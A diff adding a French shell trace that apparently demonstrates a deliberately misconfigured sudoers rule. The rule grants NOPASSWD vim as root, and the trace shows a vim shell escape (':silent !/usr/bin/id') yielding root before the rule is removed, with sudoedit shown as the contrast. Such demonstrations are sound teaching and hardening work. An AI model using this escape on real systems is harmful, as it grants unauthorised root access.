@@ -1,0 +1,80 @@
++ $ rpm -q vim-enhanced
+le paquet vim-enhanced n'est pas installé
++ $ dnf -y -q install vim-enhanced
+
+Installé:
+  gpm-libs-1.20.7-29.el9.x86_64                                                 
+  vim-common-2:8.2.2637-26.el9_8.23.x86_64                                      
+  vim-enhanced-2:8.2.2637-26.el9_8.23.x86_64                                    
+  vim-filesystem-2:8.2.2637-26.el9_8.23.noarch                                  
+
++ $ ls -l /usr/bin/vi /usr/bin/vim
+-rwxr-xr-x. 1 root root 1452216 20 mai   03:44 /usr/bin/vi
+-rwxr-xr-x. 1 root root 4028480  6 oct.  11:10 /usr/bin/vim
++ $ echo 'nadia ALL=(root) NOPASSWD: /usr/bin/vim /srv/helios/projets/transport/*'
++ $ chmod 0440 /etc/sudoers.d/99-mauvais-exemple
++ $ visudo -c
+/etc/sudoers : analyse réussie
+/etc/sudoers.d/90-helios-ops : analyse réussie
+/etc/sudoers.d/91-nadia-edition : analyse réussie
+/etc/sudoers.d/99-mauvais-exemple : analyse réussie
++ $ sudo -l -U nadia
++ $ tail -2
+    (root) sudoedit /srv/helios/projets/transport/*
+    (root) NOPASSWD: /usr/bin/vim /srv/helios/projets/transport/*
++ $ su - nadia -c 'sudo -n -l vim /srv/helios/projets/transport/tournee-nadia.csv'
+/bin/vim /srv/helios/projets/transport/tournee-nadia.csv
++ $ echo rc=0
+rc=0
++ $ rm -f /tmp/evasion-id.txt
++ $ su - nadia -c 'printf '\'':silent !/usr/bin/id > /tmp/evasion-id.txt\n:qa!\n'\'' | timeout 30 sudo -n vim /srv/helios/projets/transport/tournee-nadia.csv'
+Vim : Alerte : La sortie ne s'effectue pas sur un terminal
+Vim : Alerte : L'entrée ne se fait pas sur un terminal
+
+E558: La description du terminal est introuvable dans terminfo
+'unknown' inconnu. Les terminaux intégrés sont :
+    builtin_amiga
+    builtin_ansi
+    builtin_pcansi
+    builtin_win32
+    builtin_vt320
+    builtin_vt52
+    builtin_xterm
+    builtin_iris-ansi
+    builtin_debug
+    builtin_dumb
+utilisation par défaut de 'ansi'
+[0m[H[2J[24;1H"/srv/helios/projets/transport/tournee-nadia.csv"<elios/projets/transport/tournee-nadia.csv" 1L, 37B[1;1Hligne ajoutee par nadia via sudoedit
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~[0m[24;63H1,1[10CTout[1;1H[24;1H[K[24;1H:silent !/usr/bin/id > /tmp/evasion-id.txt[24;1H[24;63H1,1[10CTout[1;1H[24;1H[K[24;1H:qa![24;1H[K[24;1H+ $ echo rc=0
+rc=0
++ $ cat /tmp/evasion-id.txt
+uid=0(root) gid=0(root) groupes=0(root) contexte=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
++ $ ls -l /tmp/evasion-id.txt
+-rw-r--r--. 1 root root 103  3 nov.  11:30 /tmp/evasion-id.txt
++ $ rm -f /etc/sudoers.d/99-mauvais-exemple /tmp/evasion-id.txt
++ $ visudo -c
+/etc/sudoers : analyse réussie
+/etc/sudoers.d/90-helios-ops : analyse réussie
+/etc/sudoers.d/91-nadia-edition : analyse réussie
++ $ set +x
